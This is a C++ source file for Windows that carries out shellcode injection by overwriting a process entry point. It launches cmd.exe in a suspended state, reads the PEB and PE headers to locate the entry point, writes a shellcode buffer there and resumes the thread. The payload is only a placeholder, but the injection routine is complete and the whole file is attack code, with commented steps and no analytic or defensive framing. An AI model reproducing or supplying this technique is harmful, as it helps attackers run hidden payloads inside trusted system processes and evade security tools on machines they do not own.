#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);
}
